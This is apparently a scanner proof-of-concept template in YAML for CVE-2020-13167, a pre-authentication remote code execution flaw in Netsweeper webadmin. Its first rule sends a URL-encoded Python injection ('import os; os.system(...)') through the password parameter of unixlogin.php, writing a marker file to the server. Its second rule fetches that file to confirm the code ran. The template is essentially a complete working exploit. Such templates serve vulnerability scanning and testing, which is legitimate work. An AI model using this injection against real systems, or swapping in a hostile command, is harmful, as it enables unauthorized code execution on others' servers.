name: poc-yaml-netsweeper-webadmin-cve-2020-13167
binding: f5e36f2f-ca19-4c5b-8f68-e8273c00f80e
manual: true
detail:
    author: 2husky
    links:
        - https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/
    vulnerability:
        id: CT-108286
        level: critical
    warning: 注意该脚本会上传文件产生一个临时的无害文件
transport: http
set:
    url: request.url.scheme + "://" + request.url.host
    f1: randomLowercase(8)
    f2: string(randomInt(10000, 20000))
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /webadmin/tools/unixlogin.php?login=admin&password=g'%2C'')%3Bimport%20os%3Bos.system('echo%20{{f1}}%20%3E%20log{{f2}}.txt')%23&timeout=5
            headers:
                Referer: '{{url}}/webadmin/admin/service_manager_data.php'
            follow_redirects: false
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /webadmin/tools/log{{f2}}.txt
            headers:
                Referer: '{{url}}/webadmin/admin/service_manager_data.php'
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(f1))
expression: r0() && r1()
